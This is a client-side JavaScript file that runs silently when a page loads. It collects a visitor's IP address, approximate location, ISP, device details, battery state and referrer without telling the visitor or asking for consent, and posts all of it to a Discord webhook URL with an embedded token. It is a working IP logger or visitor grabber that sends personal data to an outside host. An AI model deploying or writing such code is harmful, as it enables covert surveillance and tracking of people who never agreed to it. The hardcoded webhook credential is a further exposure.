window.addEventListener('DOMContentLoaded', (event) => {
    // This is the Discord webhook URL where the data will be sent.
    // Remember to replace this with your actual webhook URL.
    const webhookUrl = 'https://discord.com/api/webhooks/1406107665939042345/s8XXhrjJOdg5xYp4bMx3MsYaMhPpD-AXxnt3uOMUCdIErtabNOP-1BUMDX6Js5gXYK7p';

    // Function to get a generalized country/city location using multiple reliable APIs.
    // This makes the IP lookup more robust against API failures or network issues.
    async function fetchIpData() {
        const services = [
            // Primary service: ip-api.com (using HTTPS for security)
            { url: 'https://ip-api.com/json/', parse: data => ({ ip: data.query, city: data.city, country: data.country, isp: data.isp, region: data.regionName, timezone: data.timezone }) },
            // Secondary service: ipinfo.io (as a fallback)
            { url: 'https://ipinfo.io/json', parse: data => ({ ip: data.ip, city: data.city, country: data.country, isp: data.org, region: data.region, timezone: data.timezone }) }
        ];

        for (const service of services) {
            try {
                const response = await fetch(service.url);
                if (!response.ok) {
                    console.warn(`Failed to fetch IP from ${service.url}, trying next service...`);
                    continue;
                }
                const data = await response.json();
                // Check if the service returned a valid IP before returning
                if (data.ip || data.query) {
                    return service.parse(data);
                }
            } catch (error) {
                console.error(`Error fetching from ${service.url}:`, error);
            }
        }
        // Return default values if all services fail
        return { ip: 'Unknown IP', city: 'Unknown City', country: 'Unknown Country', isp: 'Unknown ISP', region: 'Unknown Region', timezone: 'Unknown Timezone' };
    }

    // Function to determine the OS and device type from the user agent string.
    function getDeviceInfo() {
        const userAgent = navigator.userAgent;
        let os = 'Unknown OS';
        let browser = 'Unknown Browser';
        let platform = 'Unknown';

        // Detect OS
        if (userAgent.includes('Windows')) os = 'Windows';
        else if (userAgent.includes('Macintosh')) os = 'macOS';
        else if (userAgent.includes('Linux')) os = 'Linux';
        else if (userAgent.includes('Android')) os = 'Android';
        else if (userAgent.includes('iPhone')) os = 'iOS';
        else if (userAgent.includes('iPad')) os = 'iPadOS';

        // Detect Browser
        if (userAgent.includes('Edg')) browser = 'Microsoft Edge';
        else if (userAgent.includes('Chrome')) browser = 'Google Chrome';
        else if (userAgent.includes('Firefox')) browser = 'Mozilla Firefox';
        else if (userAgent.includes('Safari')) browser = 'Apple Safari';

        // Get Platform
        if (navigator.platform) {
            platform = navigator.platform;
        }

        return { os, browser, platform };
    }

    // Function to get battery information if available
    async function getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: `${(battery.level * 100).toFixed(0)}%`,
                    charging: battery.charging ? 'Yes' : 'No'
                };
            }
        } catch (e) {
            console.error('Battery API not available or blocked:', e);
        }
        return { level: 'N/A', charging: 'N/A' };
    }

    // Main function to collect data and send to webhook
    async function sendVisitorInfo() {
        const now = new Date();
        const { os, browser, platform } = getDeviceInfo();
        const { country, city, isp, ip, region, timezone } = await fetchIpData();
        const { level, charging } = await getBatteryInfo();
        const screenResolution = `${screen.width}x${screen.height}`;
        const windowResolution = `${window.innerWidth}x${window.innerHeight}`;
        const cpuCores = navigator.hardwareConcurrency || 'Unknown';
        const referrer = document.referrer || 'Direct';

        // Construct the embed payload for Discord with a green color and boxed fields
        const payload = {
            embeds: [{
                title: "New Visitor Log 👽",
                color: 3066993, // A nice green color
                fields: [
                    {
                        name: "Message 🚀",
                        value: "Visitor information collected securely. 🕵️‍♂️",
                        inline: false
                    },
                    {
                        name: "🌍 Location Info",
                        value: `**IP Address:** \`${ip}\`\n**Country:** ${country}\n**Region:** ${region}\n**City:** ${city}\n**ISP:** ${isp}\n**Time Zone:** ${timezone}`,
                        inline: false
                    },
                    {
                        name: "💻 Device Info",
                        value: `**OS:** ${os}\n**Platform:** ${platform}\n**Browser:** ${browser}\n**Screen Resolution:** ${screenResolution}\n**Window Size:** ${windowResolution}\n**CPU Cores:** ${cpuCores}\n**Language:** ${navigator.language || 'Unknown'}`,
                        inline: false
                    },
                    {
                        name: "🔋 Power & Connection",
                        value: `**Battery Level:** ${level}\n**Charging:** ${charging}\n**Network Type:** ${navigator.connection?.type || 'Unknown'}\n**Referrer:** ${referrer}`,
                        inline: false
                    },
                    {
                        name: "📅 Timestamps",
                        value: `**Timestamp:** ${now.toLocaleString()}\n**Page Load Time:** ${performance.now().toFixed(2)}ms`,
                        inline: false
                    }
                ],
                footer: {
                    text: "Visitor data sent to webhook.",
                    icon_url: "https://placehold.co/64x64/00ff37/ffffff?text=✅"
                }
            }]
        };

        // Send the payload to the webhook
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (!response.ok) {
                console.error('Webhook failed to send:', response.status, response.statusText);
            }
        })
        .catch(error => {
            console.error('Error sending webhook:', error);
        });
    }

    // Call the main function to run the script
    sendVisitorInfo();
});
